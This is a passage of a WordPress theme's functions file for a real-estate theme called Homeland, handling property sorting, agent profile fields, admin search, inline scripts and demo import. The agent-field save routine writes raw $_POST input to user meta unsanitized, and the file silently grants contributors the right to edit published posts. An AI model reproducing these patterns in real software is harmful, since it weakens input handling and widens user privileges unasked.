			$homeland_ga_code = get_option( 'homeland_ga_code' );

			if ( !empty( $homeland_ga_code ) ) : 
				echo stripslashes( $homeland_ga_code );
			endif;
		}
	endif; 
	add_action( 'wp_footer', 'homeland_google_analytics', 100 );


	/**
	 * Property Filters
	 */
	if ( ! function_exists( 'homeland_property_listings' ) ) :
		function homeland_property_listings( $homeland_property_list_args ) {
			$homeland_filter_default = get_option( 'homeland_filter_default' );

			if( is_page_template( 'templates/template-properties-sold.php' ) ) :
				$homeland_search_query = array( 
					'relation' => 'OR',
					array( 'key' => 'homeland_property_sold', 'value' => 'on', 'compare' => '==' ),
					array( 'relation' => 'AND',
						array( 'key' => 'homeland_price', 'compare' => 'EXISTS' ),
			  		array( 'key' => 'homeland_price', 'compare' => 'NOT EXISTS' ),
					),    
				);
			elseif( is_page_template( 'templates/template-properties-featured.php' ) ) :
				$homeland_search_query = array( 
					'relation' => 'OR',
					array( 'key' => 'homeland_featured', 'value' => 'on', 'compare' => '==' ),
					array( 'relation' => 'AND',
						array( 'key' => 'homeland_price', 'compare' => 'EXISTS' ),
			  		array( 'key' => 'homeland_price', 'compare' => 'NOT EXISTS' ),
					),    
				);
			elseif( is_page_template( 'templates/template-open-house.php' ) ) :
				$homeland_search_query = array( 
					'relation' => 'OR', array( 
						'key' => 'homeland_property_open_house', 'value' => 'on', 'compare' => '==' ),
					array( 'relation' => 'AND',
						array( 'key' => 'homeland_price', 'compare' => 'EXISTS' ),
			  		array( 'key' => 'homeland_price', 'compare' => 'NOT EXISTS' ),
					),    
				);
			else :
				$homeland_search_query = array( 'relation' => 'OR',
					array( 'key' => 'homeland_price', 'compare' => 'EXISTS' ),
			  	array( 'key' => 'homeland_price', 'compare' => 'NOT EXISTS' ), 
				);
			endif;

	   	if( isset( $_GET['order'] ) ) :
			  $homeland_property_list_args['order'] = $_GET['order'] == "ASC" ? 'ASC' : 'DESC';
			endif;

			if( isset($_GET['sortby'] ) ) :

				// Name
				if( 'title' === $homeland_filter_default ) :
					if( 'price' === $_GET['sortby'] ) :
						$homeland_property_list_args['meta_query'] = $homeland_search_query;
						$homeland_property_list_args['orderby'] = 'meta_value_num';
					elseif( 'date' === $_GET['sortby'] ) :
						$homeland_property_list_args['orderby'] = 'date';
					elseif( 'rand' === $_GET['sortby'] ) :
						$homeland_property_list_args['orderby'] = 'rand';
					else :
						$homeland_property_list_args['orderby'] = 'title';
					endif;

				// Price
				elseif( 'price' === $homeland_filter_default ) :
					if( 'date' === $_GET['sortby'] ) :
					  $homeland_property_list_args['orderby'] = 'date';
					elseif( 'title' === $_GET['sortby'] ) :
					  $homeland_property_list_args['orderby'] = 'title';
					elseif( 'rand' === $_GET['sortby'] ) :
					  $homeland_property_list_args['orderby'] = 'rand';
					else :
						$homeland_property_list_args['meta_query'] = $homeland_search_query;
						$homeland_property_list_args['orderby'] = 'meta_value_num';
					endif;

				// Random
				elseif( 'rand' === $homeland_filter_default ) :
					if( 'date' === $_GET['sortby'] ) :
					  $homeland_property_list_args['orderby'] = 'date';
					elseif( 'title' === $_GET['sortby'] ) :
					  $homeland_property_list_args['orderby'] = 'title';
					elseif( 'price' === $_GET['sortby'] ) :
						$homeland_property_list_args['meta_query'] = $homeland_search_query;
						$homeland_property_list_args['orderby'] = 'meta_value_num';
					else :
						$homeland_property_list_args['orderby'] = 'rand';
					endif;

				// Date
				else :
					if( 'price' === $_GET['sortby'] ) :
					 	$homeland_property_list_args['meta_query'] = $homeland_search_query;
						$homeland_property_list_args['orderby'] = 'meta_value_num';
					elseif( 'title' === $_GET['sortby'] ) :
					  $homeland_property_list_args['orderby'] = 'title';
					elseif( 'rand' === $_GET['sortby'] ) :
					  $homeland_property_list_args['orderby'] = 'rand';
					else :
						$homeland_property_list_args['orderby'] = 'date';
					endif;
				endif;
			endif;

			return $homeland_property_list_args;
	   }
	endif;
  add_filter( 'homeland_properties_parameters', 'homeland_property_listings' );


  /**
	 * Add Lightbox for gallery shortcode
	 */
	if( ! function_exists( 'homeland_gallery_lightbox' ) ) :
		function homeland_gallery_lightbox( $homeland_link, $homeland_permalink ) {
	    if ( !is_admin() ) :
	      if ( ! $homeland_permalink )
	        $homeland_link = str_replace( '<a href', '<a class="large-image-popup" href', $homeland_link );
	    endif;
	    return $homeland_link;
		}
		endif;
	add_filter( 'wp_get_attachment_link', 'homeland_gallery_lightbox', 10, 6 );


	/**
	 * Rewrite Author Base Slug
	 */
	if ( ! function_exists( 'homeland_new_author_base' ) ) :
		function homeland_new_author_base() {
	    global $wp_rewrite;
	    $author_slug = 'agent';
	    $wp_rewrite->author_base = $author_slug;
		}
	endif;
	add_action( 'init', 'homeland_new_author_base' );


	/**
	 * Add New Custom Fields for Agents
	 */
	if ( ! function_exists( 'homeland_add_fields_agents' ) ) :
		function homeland_add_fields_agents($user) { 
			if(is_object($user)) :
        $homeland_agent_avatar = get_the_author_meta( 'homeland_custom_avatar', $user->ID);
        $homeland_designation = get_the_author_meta( 'homeland_designation', $user->ID );
        $homeland_twitter = get_the_author_meta( 'homeland_twitter', $user->ID );
        $homeland_facebook = get_the_author_meta( 'homeland_facebook', $user->ID );
        $homeland_gplus = get_the_author_meta( 'homeland_gplus', $user->ID );
        $homeland_linkedin = get_the_author_meta( 'homeland_linkedin', $user->ID );
        $homeland_telno = get_the_author_meta( 'homeland_telno', $user->ID );
        $homeland_mobile = get_the_author_meta( 'homeland_mobile', $user->ID );
        $homeland_fax = get_the_author_meta( 'homeland_fax', $user->ID );
	    else :
	      $homeland_agent_avatar = "";
	      $homeland_designation = "";
	      $homeland_twitter = "";
	      $homeland_facebook = "";
	      $homeland_gplus = "";
	      $homeland_linkedin = "";
	      $homeland_telno = "";
	      $homeland_mobile = "";
	      $homeland_fax = "";
	    endif;
			?>
				<h2><?php esc_html_e( 'More Informations', 'homeland' ); ?></h2> 
				<table class="form-table">
					<tr>
						<th><label for="homeland_designation"><?php esc_html_e( 'Designation', 'homeland' ); ?></label></th>
						<td>
							<input type="text" name="homeland_designation" id="homeland_designation" value="<?php echo esc_html( $homeland_designation ); ?>" class="regular-text" />
						</td>
					</tr>
					<tr>
						<th><label for="homeland_twitter"><?php esc_html_e( 'Twitter', 'homeland' ); ?></label></th>
						<td>
							<input type="text" name="homeland_twitter" id="homeland_twitter" value="<?php echo esc_html( $homeland_twitter ); ?>" class="regular-text" />
						</td>
					</tr>
					<tr>
						<th><label for="homeland_facebook"><?php esc_html_e( 'Facebook', 'homeland' ); ?></label></th>
						<td>
							<input type="text" name="homeland_facebook" id="homeland_facebook" value="<?php echo esc_html( $homeland_facebook ); ?>" class="regular-text" />
						</td>
					</tr>
					<tr>
						<th><label for="homeland_gplus"><?php esc_html_e( 'Google Plus', 'homeland' ); ?></label></th>
						<td>
							<input type="text" name="homeland_gplus" id="homeland_gplus" value="<?php echo esc_html( $homeland_gplus ); ?>" class="regular-text" />
						</td>
					</tr>
					<tr>
						<th><label for="homeland_linkedin"><?php esc_html_e( 'LinkedIn', 'homeland' ); ?></label></th>
						<td>
							<input type="text" name="homeland_linkedin" id="homeland_linkedin" value="<?php echo esc_html( $homeland_linkedin ); ?>" class="regular-text" />
						</td>
					</tr>
					<tr>
						<th><label for="homeland_telno"><?php esc_html_e( 'Telephone', 'homeland' ); ?></label></th>
						<td>
							<input type="text" name="homeland_telno" id="homeland_telno" value="<?php echo esc_html( $homeland_telno ); ?>" class="regular-text" />
						</td>
					</tr>
					<tr>
						<th><label for="homeland_mobile"><?php esc_html_e( 'Mobile', 'homeland' ); ?></label></th>
						<td>
							<input type="text" name="homeland_mobile" id="homeland_mobile" value="<?php echo esc_html( $homeland_mobile ); ?>" class="regular-text" />
						</td>
					</tr>
					<tr>
						<th><label for="homeland_fax"><?php esc_html_e( 'Fax', 'homeland' ); ?></label></th>
						<td>
							<input type="text" name="homeland_fax" id="homeland_fax" value="<?php echo esc_html( $homeland_fax ); ?>" class="regular-text" />
						</td>
					</tr>
					<tr>
						<th><label for="homeland_custom_avatar"><?php esc_html_e( 'Avatar', 'homeland' ); ?></label></th>
						<td>
							<input type="text" name="homeland_custom_avatar" id="homeland_custom_avatar" value="<?php echo esc_html( $homeland_agent_avatar ); ?>" class="regular-text" /><input id="upload_image_button_avatar" type="button" value="<?php esc_html_e( 'Upload', 'homeland' ); ?>" class="button-secondary" /><br />
							<span class="description">
								<?php esc_html_e( 'This will override your default Gravatar or show up if you dont have a Gravatar', 'homeland' ); ?><br /><strong><?php esc_html_e( 'Image should be 600x400 pixels', 'homeland' ); ?>.</strong>
							</span>
						</td>
					</tr>
				</table>
			<?php 
		}
	endif;
	add_action( 'show_user_profile', 'homeland_add_fields_agents' );
	add_action( 'edit_user_profile', 'homeland_add_fields_agents' );
	add_action( 'user_new_form', 'homeland_add_fields_agents' );

	// Saving New Fields
	if ( ! function_exists( 'homeland_save_fields_agents' ) ) :
		function homeland_save_fields_agents( $user_id ) {
			if( !current_user_can( 'edit_user', $user_id ) ) { return false; }
			update_user_meta( $user_id, 'homeland_custom_avatar', $_POST['homeland_custom_avatar'] );
			update_user_meta( $user_id, 'homeland_designation', $_POST['homeland_designation'] );
			update_user_meta( $user_id, 'homeland_twitter', $_POST['homeland_twitter'] );
			update_user_meta( $user_id, 'homeland_facebook', $_POST['homeland_facebook'] );
			update_user_meta( $user_id, 'homeland_gplus', $_POST['homeland_gplus'] );
			update_user_meta( $user_id, 'homeland_linkedin', $_POST['homeland_linkedin'] );
			update_user_meta( $user_id, 'homeland_telno', $_POST['homeland_telno'] );
			update_user_meta( $user_id, 'homeland_mobile', $_POST['homeland_mobile'] );
			update_user_meta( $user_id, 'homeland_fax', $_POST['homeland_fax'] );
		}
	endif;
	add_action( 'personal_options_update', 'homeland_save_fields_agents' );
	add_action( 'edit_user_profile_update', 'homeland_save_fields_agents' );
	add_action( 'user_register', 'homeland_save_fields_agents' );


	/**
	 * Search CPT admin for properties
	 */
	global $homeland_postmeta_alias, $homeland_is_specials_search;
	$homeland_cpt_name = 'homeland_properties';
	$homeland_postmeta_alias = 'homeland_pm';
	$homeland_is_specials_search = is_admin() && $pagenow=='edit.php' && isset( $_GET['post_type'] ) && $_GET['post_type']==$homeland_cpt_name && isset( $_GET['s'] );

	if( $homeland_is_specials_search ) :
		add_filter( 'posts_join', 'homeland_description_search_join' );
		add_filter( 'posts_where', 'homeland_description_search_where' );
		add_filter( 'posts_groupby', 'homeland_search_dupe_fix' );
	endif;

	if ( ! function_exists( 'homeland_description_search_join' ) ) :
		function homeland_description_search_join( $homeland_join ) {
	  	global $homeland_pagenow, $wpdb, $homeland_postmeta_alias, $homeland_is_specials_search;

	  	if( $homeland_is_specials_search )  
	    	$homeland_join .='LEFT JOIN '.$wpdb->postmeta. ' as ' . $homeland_postmeta_alias . ' ON '. $wpdb->posts . '.ID = ' . $homeland_postmeta_alias . '.post_id ';
	  	return $homeland_join;
		}
	endif;

	if ( ! function_exists( 'homeland_description_search_where' ) ) :
		function homeland_description_search_where( $homeland_where ) {
			global $homeland_pagenow, $wpdb, $homeland_postmeta_alias, $homeland_is_specials_search;

			if( $homeland_is_specials_search )
			 	$homeland_where = preg_replace("/\(\s*".$wpdb->posts.".post_title\s+LIKE\s*(\'[^\']+\')\s*\)/", "(".$wpdb->posts.".post_title LIKE $1) OR (".$homeland_postmeta_alias.".meta_value LIKE $1)", $homeland_where);
			return $homeland_where;
		} 
	endif;

	if( ! function_exists( 'homeland_search_dupe_fix' ) ) :
		function homeland_search_dupe_fix($homeland_groupby) {
			global $homeland_pagenow, $wpdb, $homeland_is_specials_search;

			if($homeland_is_specials_search) $homeland_groupby = "$wpdb->posts.ID";
			return $homeland_groupby;
		} 
	endif;


	/**
	 * Sticky Header jQuery
	 */
	if( ! function_exists( 'homeland_header_sticky_js' ) ) :
		function homeland_header_sticky_js() {
			$homeland_sticky_header = get_option( 'homeland_sticky_header' );
			$homeland_theme_header = get_option( 'homeland_theme_header' );

			wp_enqueue_script( 'homeland-custom-js', get_theme_file_uri( '/assets/js/custom.min.js' ), array( 'jquery' ), '', true );
		
			$homeland_custom_js = "(function($) {
				'use strict'; 
				$(window).scroll(function() {
		      if ($(this).scrollTop() > 2){  
		        $('header').addClass('sticky-header-animate');
		      }else{
		        $('header').removeClass('sticky-header-animate');
		      }
		    });
			})(jQuery);";

			if( !empty( $homeland_sticky_header ) || 'Header 4' === $homeland_theme_header ) :
				wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );
			endif;
		}
	endif;
	add_action( 'wp_enqueue_scripts', 'homeland_header_sticky_js' );


	/**
	 * Parallax jQuery
	 */
	if( ! function_exists( 'homeland_parallax_js' ) ) :
		function homeland_parallax_js() {
			$homeland_parallax = get_option( 'homeland_parallax' );

			wp_enqueue_script( 'homeland-custom-js', get_theme_file_uri( '/assets/js/custom.min.js' ), array( 'jquery' ), '', true );
		
			$homeland_custom_js = "(function($) {
				'use strict'; 

				$(window).load(function() {
					$('[data-paroller-factor]').paroller();
				});
			})(jQuery);";

			if( !empty( $homeland_parallax ) ) :
				wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );
			endif;
		}
	endif;
	add_action( 'wp_enqueue_scripts', 'homeland_parallax_js' );


	/**
	 * Coming Soon New Date
	 * Format should be (Year, Month-1, Day)
	 */
	if( ! function_exists( 'homeland_coming_soon_date' ) ) :
		function homeland_coming_soon_date() {
			wp_enqueue_script( 'homeland-custom-js', get_theme_file_uri( '/assets/js/custom.min.js' ), array( 'jquery' ), '', true );
		
			$homeland_custom_js = "(function($) {
				'use strict'; 
				$('#defaultCountdown').countdown({
					until: new Date(". esc_attr( get_option( 'homeland_new_date' ) ) .")
				});
			})(jQuery);";

			if( is_page_template( 'templates/template-coming-soon.php' ) ) :
				wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );
			endif;
		}
	endif;
	add_action( 'wp_enqueue_scripts', 'homeland_coming_soon_date' );


	/**
	 * Remove Revolution Slider Meta Boxes
	 */
	if( ! function_exists( 'homeland_remove_revolution_slider_meta_boxes' ) ) :
		function homeland_remove_revolution_slider_meta_boxes() {
			if( is_admin() ) :
				remove_meta_box( 'mymetabox_revslider_0', 'page', 'normal' );
				remove_meta_box( 'mymetabox_revslider_0', 'post', 'normal' );
				remove_meta_box( 'mymetabox_revslider_0', 'sidebar', 'normal' );
				remove_meta_box( 'mymetabox_revslider_0', 'homeland_properties', 'normal' );
				remove_meta_box( 'mymetabox_revslider_0', 'homeland_services', 'normal' );
				remove_meta_box( 'mymetabox_revslider_0', 'homeland_testimonial', 'normal' );
				remove_meta_box( 'mymetabox_revslider_0', 'homeland_partners', 'normal' );
				remove_meta_box( 'mymetabox_revslider_0', 'homeland_portfolio', 'normal' );
			endif;
		}
	endif;
	add_action( 'do_meta_boxes', 'homeland_remove_revolution_slider_meta_boxes' );


	/**
	 * Add odd/even post class
	 */
	if ( ! function_exists( 'homeland_oddeven_post_class' ) ) :
		function homeland_oddeven_post_class ( $homeland_classes ) {
			global $homeland_current_class;
			$homeland_classes[] = $homeland_current_class;
			$homeland_current_class = ( $homeland_current_class == 'odd' ) ? 'even' : 'odd';
			return $homeland_classes;
		}
	endif;
	add_filter ( 'post_class' , 'homeland_oddeven_post_class' );
	global $homeland_current_class;
	$homeland_current_class = 'odd';


	/**
	 * Ability of Contributor to edit post
	 */
	$obj_existing_role = get_role( 'contributor' );
	$obj_existing_role->add_cap( 'edit_published_posts' );


	/**
	 * Add Image Sizes in attachment display settings
	 */
 	if ( ! function_exists( 'homeland_image_custom_sizes' ) ) :
		function homeland_image_custom_sizes( $sizes ) {
	    return array_merge( $sizes, array(
        'homeland_thumbs' => esc_html__( 'Theme Thumbnail', 'homeland' ),
        'homeland_large_thumb' => esc_html__( 'Theme Large Thumbnail', 'homeland' ),
        'homeland_large_image' => esc_html__( 'Theme Large Image', 'homeland' ),
        'homeland_bigger_image' => esc_html__( 'Theme Bigger Image', 'homeland' ),
        'homeland_slider' => esc_html__( 'Slider Image', 'homeland' ),
	    ));

		}
	endif;
	add_filter( 'image_size_names_choose', 'homeland_image_custom_sizes' );


	/**
	 * Property Price Format
	 */
	if ( ! function_exists( 'homeland_property_price_format' ) ) :
		function homeland_property_price_format() {
			global $post;

			$homeland_property_decimal = get_option( 'homeland_property_decimal' );
			$homeland_property_currency_sign = get_option( 'homeland_property_currency_sign' );
			$homeland_property_currency = get_option( 'homeland_property_currency' );
			$homeland_price_format = get_option( 'homeland_price_format' );

			$homeland_property_currency_before = "";
			$homeland_property_currency_after = "";
			$homeland_price_per_result = "";
			$homeland_property_decimal_value = !empty( $homeland_property_decimal ) ? $homeland_property_decimal : 0;

			// currency position
			if( 'After' === $homeland_property_currency_sign ) : 
				$homeland_property_currency_after = !empty( $post->homeland_property_currency ) ? $post->homeland_property_currency : $homeland_property_currency;
			else :
				$homeland_property_currency_before = !empty( $post->homeland_property_currency ) ? $post->homeland_property_currency : $homeland_property_currency;
			endif;

			// price format
			if( 'Dot' === $homeland_price_format ) :
				$homeland_price_format_result = number_format ( $post->homeland_price, $homeland_property_decimal_value, ".", "." );
			elseif( 'Comma' === $homeland_price_format ) : 
				$homeland_price_format_result = number_format ( $post->homeland_price, $homeland_property_decimal_value );
			elseif( 'Brazil' === $homeland_price_format || 'Europe' === $homeland_price_format ) :
				$homeland_price_format_result = number_format( $post->homeland_price, $homeland_property_decimal_value, ",", "." );
			else : 
				$homeland_price_format_result = $post->homeland_price;
			endif;

			// price per
			$homeland_price_per_result = !empty( $post->homeland_price_per ) ? "/" . $post->homeland_price_per : '';

			// price results
			echo esc_html( $homeland_property_currency_before ) . esc_html( $homeland_price_format_result ) . esc_html( $homeland_property_currency_after ) . esc_html( $homeland_price_per_result );
		}
	endif;


	/**
	 * Cleaner way to display get_options
	 */
	function homeland_option( $db_field, $default ) {
	  $get_option = esc_attr( get_option( $db_field ) );
	  if( empty( $get_option ) ) :
	    $get_option = $default;
	  endif;
	  return $get_option;
	}


	/**
	 * Demo Theme Import
	 */
	if( class_exists( 'OCDI_Plugin' ) ) :
	 	function homeland_import_files() {
		  return array(
		    array(
		      'import_file_name'           => esc_html__( 'homeland', 'homeland' ),
		      'categories'                 => '',
		      'import_file_url'            => esc_url( 'https://qbootstrap.com/wp/imports/homeland/homeland.wordpress.xml' ),
		      'import_widget_file_url'     => esc_url( 'https://qbootstrap.com/wp/imports/homeland/qbootstrap.com-wp-homeland-widgets.wie' ),
		      'import_customizer_file_url' => esc_url( 'https://qbootstrap.com/wp/imports/homeland/homeland-export.dat' ),
		      'import_preview_image_url'   => esc_url( 'https://qbootstrap.com/wp/imports/homeland/thumbnail.png' ),
		      'import_notice'              => esc_html__( 'After you import this demo, you will have to setup the slider separately.', 'homeland' ),
		      'preview_url'                => esc_url( 'https://qbootstrap.com/wp/homeland/' ),
		    ),
		    array(
		      'import_file_name'           => esc_html__( 'homeland Boxed', 'homeland' ),
		      'categories'                 => '',
		      'import_file_url'            => esc_url( 'https://qbootstrap.com/wp/imports/homeland-box/homeland.wordpress.xml' ),
		      'import_widget_file_url'     => esc_url( 'https://qbootstrap.com/wp/imports/homeland-box/qbootstrap.com-wp-homeland-widgets.wie' ),
		      'import_customizer_file_url' => esc_url( 'https://qbootstrap.com/wp/imports/homeland-box/homeland-export.dat' ),
		      'import_preview_image_url'   => esc_url( 'https://qbootstrap.com/wp/imports/homeland-box/thumbnail.png' ),
		      'import_notice'              => esc_html__( 'After you import this demo, you will have to setup the slider separately.', 'homeland' ),
		      'preview_url'                => esc_url( 'https://qbootstrap.com/wp/homeland/' ),
		    ),
		  );
		}
		add_filter( 'pt-ocdi/import_files', 'homeland_import_files' );

		function homeland_after_import_setup() {
			// Assign menus to their locations.
			$main_menu = get_term_by( 'name', 'main-menu', 'nav_menu' );
			$footer_menu = get_term_by( 'name', 'footer-menu', 'nav_menu' );

			set_theme_mod( 'nav_menu_locations', array( 
				'primary-menu' => $main_menu->term_id,
				'footer-menu' => $footer_menu->term_id, ) );

			// Assign front page
			$front_page_id = get_page_by_title( 'Home' );

			update_option( 'show_on_front', 'page' );
			update_option( 'page_on_front', $front_page_id->ID );

		}
		add_action( 'pt-ocdi/after_import', 'homeland_after_import_setup' );
		add_filter( 'pt-ocdi/disable_pt_branding', '__return_true' );
		add_action( 'pt-ocdi/enable_wp_customize_save_hooks', '__return_true' );
	endif;
?>